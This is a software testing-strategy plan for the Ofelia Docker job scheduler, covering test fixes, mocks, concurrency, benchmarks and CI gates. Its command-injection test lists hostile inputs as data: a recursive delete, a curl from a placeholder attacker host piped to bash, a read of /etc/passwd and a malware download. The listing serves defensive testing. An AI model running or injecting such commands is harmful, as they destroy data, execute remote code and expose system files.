# Ofelia Testing Strategy Enhancement Plan

## Current Testing Landscape Analysis

### Test Distribution
- **Total Test Files**: 53 across all packages
- **Test-to-Code Ratio**: ~75% (good coverage of test files)
- **Package Coverage Variance**: High (30.1% to 92.1%)

### Testing Framework Usage
- **Primary**: Go's built-in testing framework
- **Assertion Style**: Manual comparison with `t.Errorf`
- **Test Helpers**: Limited custom test utilities
- **Integration Testing**: Present but inconsistent

## Enhanced Testing Strategy

### 1. Immediate Test Fixes (Week 1)

#### Fix Failing Compose Job Tests
```go
// File: core/composejob_test.go
// Current failing expectations need update for modern Docker Compose

func TestComposeJobBuildCommand(t *testing.T) {
    tests := []struct {
        name     string
        job      *ComposeJob
        wantArgs []string
    }{
        {
            name: "Run command",
            job: &ComposeJob{
                BareJob: BareJob{Command: `echo "foo bar"`},
                File:    "compose.yml",
                Service: "svc",
            },
            // Updated expectation for modern Docker Compose CLI
            wantArgs: []string{"docker", "compose", "-f", "compose.yml", "run", "--rm", "svc", "echo", "foo bar"},
        },
    }
    // ... rest of test
}
```

#### Test Environment Standardization
- Ensure all tests use consistent Docker Compose CLI version
- Add environment detection for CLI command format
- Create test fixtures for consistent container configurations

### 2. Core Package Testing Enhancement (Week 2-3)

#### Priority 1: Container Lifecycle Testing
```go
// Proposed test structure for RunJob operations

func TestRunJobLifecycle(t *testing.T) {
    // Test cases for:
    // - Container creation with various configurations
    // - Image pulling and availability checks  
    // - Container startup and health monitoring
    // - Graceful shutdown and cleanup
    // - Error handling for each phase
}

func TestRunJobErrorScenarios(t *testing.T) {
    // Test cases for:
    // - Docker daemon unavailable
    // - Image pull failures
    // - Container start failures
    // - Network connectivity issues
    // - Resource constraint violations
}
```

#### Priority 2: Concurrency Testing
```go
func TestSchedulerConcurrency(t *testing.T) {
    // Test concurrent job execution
    // Validate thread safety of job state
    // Test max concurrent job limits
    // Race condition detection
}

func TestContainerMonitoringConcurrency(t *testing.T) {
    // Multiple containers being monitored simultaneously
    // Concurrent log streaming
    // Event processing race conditions
}
```

#### Priority 3: Integration Testing Strategy
```go
// Docker Integration Test Suite
func TestDockerIntegration(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping integration tests in short mode")
    }
    
    // Require Docker daemon for integration tests
    // Test against real Docker containers
    // Validate full job execution pipeline
}
```

### 3. Test Infrastructure Improvements

#### Mock Framework Implementation
```go
// MockDockerClient for unit testing
type MockDockerClient struct {
    containers map[string]*docker.Container
    images     map[string]*docker.Image
    failures   map[string]error // Inject specific failures
}

// Interface-based testing for better isolation
type DockerInterface interface {
    CreateContainer(opts docker.CreateContainerOptions) (*docker.Container, error)
    StartContainer(id string, hostConfig *docker.HostConfig) error
    // ... other Docker operations
}
```

#### Test Helper Library
```go
// test/helpers.go - Centralized test utilities
package test

func NewTestScheduler(t *testing.T) *core.Scheduler {
    // Create scheduler with test configuration
}

func CreateTestContainer(t *testing.T, name string) *docker.Container {
    // Standard test container creation
}

func AssertJobSuccess(t *testing.T, job core.Job) {
    // Common job success validation
}

func AssertJobFailure(t *testing.T, job core.Job, expectedErr error) {
    // Common job failure validation
}
```

### 4. Edge Case Testing Matrix

#### Configuration Edge Cases
- **Invalid Cron Expressions**: Malformed, edge time values
- **Resource Limits**: Memory/CPU constraints, disk space
- **Network Conditions**: Timeout, DNS failures, proxy issues
- **File System**: Permission denied, disk full, path traversal

#### Container Edge Cases
- **Image Issues**: Missing images, corrupted images, registry failures
- **Runtime Issues**: Container crashes, OOM kills, signal handling
- **Security Issues**: Privilege escalation attempts, volume mount attacks

#### Scheduler Edge Cases
- **High Load**: 100+ concurrent jobs, memory pressure
- **Long Running**: Jobs running for hours, cleanup timeouts
- **Dependency Issues**: Circular dependencies, missing dependencies

### 5. Performance Testing Strategy

#### Load Testing Framework
```go
func BenchmarkSchedulerThroughput(b *testing.B) {
    scheduler := core.NewScheduler()
    
    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        job := createBenchmarkJob()
        scheduler.RunJob(job)
    }
}

func BenchmarkContainerCreation(b *testing.B) {
    // Measure container creation/destruction overhead
}

func BenchmarkMemoryUsage(b *testing.B) {
    // Memory allocation patterns under load
}
```

#### Performance Regression Detection
- Baseline performance metrics in CI
- Memory usage tracking over time
- Container operation timing benchmarks
- Alert on >10% performance degradation

### 6. Security Testing Implementation

#### Command Injection Testing
```go
func TestCommandInjectionPrevention(t *testing.T) {
    maliciousInputs := []string{
        "; rm -rf /",
        "$(curl evil.com/script.sh | bash)",
        "`cat /etc/passwd`",
        "&& wget malware.exe",
    }
    
    for _, input := range maliciousInputs {
        job := &core.ComposeJob{
            BareJob: core.BareJob{Command: input},
        }
        
        _, err := job.buildCommand(ctx)
        assert.Error(t, err, "Should reject malicious input: %s", input)
    }
}
```

#### Container Security Testing
```go
func TestContainerSecurityConstraints(t *testing.T) {
    // Test privilege escalation prevention
    // Validate resource limits enforcement
    // Test network isolation
    // Validate volume mount restrictions
}
```

### 7. Test Automation and CI Integration

#### Quality Gate Configuration
```yaml
# .github/workflows/test.yml enhancement
test:
  strategy:
    matrix:
      go-version: [1.21, 1.22, 1.25]
      docker-version: [20.10, 24.0, 25.0]
  
  steps:
    - name: Unit Tests
      run: go test -race -coverprofile=coverage.out ./...
      
    - name: Integration Tests  
      run: go test -tags=integration ./...
      
    - name: Performance Tests
      run: go test -bench=. -benchmem ./...
      
    - name: Security Tests
      run: go test -tags=security ./...
      
    - name: Coverage Gate
      run: |
        coverage=$(go tool cover -func=coverage.out | grep total | awk '{print $3}' | sed 's/%//')
        if (( $(echo "$coverage < 80" | bc -l) )); then
          echo "Coverage $coverage% below 80% threshold"
          exit 1
        fi
```

#### Test Data Management
```go
// testdata/ directory structure
testdata/
├── configs/           # Test configuration files
├── containers/        # Test container specifications
├── fixtures/          # Test data fixtures
└── expectations/      # Expected output files
```

### 8. Test Quality Metrics

#### Coverage Targets by Package
- **core**: 85% (critical business logic)
- **config**: 80% (configuration validation)
- **web**: 75% (API endpoints)
- **cli**: 70% (command interface)
- **middlewares**: 75% (processing logic)

#### Test Quality Indicators
- **Test-to-Code Ratio**: >1:1 (test lines >= source lines)
- **Assertion Density**: >3 assertions per test function
- **Mock Coverage**: >90% of external dependencies mocked
- **Edge Case Coverage**: >50% of tests should be edge cases

### 9. Testing Best Practices

#### Test Naming Convention
```go
// Pattern: Test[Unit]_[Condition]_[Expected]
func TestScheduler_MaxConcurrentJobs_RejectsExcess(t *testing.T)
func TestComposeJob_InvalidCommand_ReturnsError(t *testing.T)  
func TestContainerMonitor_DockerUnavailable_GracefulDegradation(t *testing.T)
```

#### Test Organization
```go
func TestFeature(t *testing.T) {
    t.Run("happy path", func(t *testing.T) {
        // Normal operation test
    })
    
    t.Run("edge case - boundary condition", func(t *testing.T) {
        // Edge case test
    })
    
    t.Run("error case - invalid input", func(t *testing.T) {
        // Error condition test
    })
}
```

### 10. Implementation Timeline

#### Week 1: Critical Fixes
- [ ] Fix failing compose job tests
- [ ] Add basic integration test infrastructure
- [ ] Implement test helper library

#### Week 2-3: Core Coverage
- [ ] RunJob lifecycle testing (80% coverage target)
- [ ] Container monitoring tests
- [ ] Scheduler concurrency tests

#### Week 4: Edge Cases & Security
- [ ] Configuration validation edge cases
- [ ] Security testing framework
- [ ] Error handling comprehensive tests

#### Week 5: Performance & Automation
- [ ] Performance benchmarking suite
- [ ] CI/CD quality gates
- [ ] Test metrics dashboard

### Success Criteria
- **Overall Coverage**: >80%
- **Core Package Coverage**: >85%
- **Zero Failing Tests**: All tests pass consistently
- **Performance Regression**: <5% degradation tolerance
- **Security Coverage**: 100% of attack vectors tested

This strategy provides a systematic approach to achieving comprehensive test coverage while maintaining code quality and operational reliability.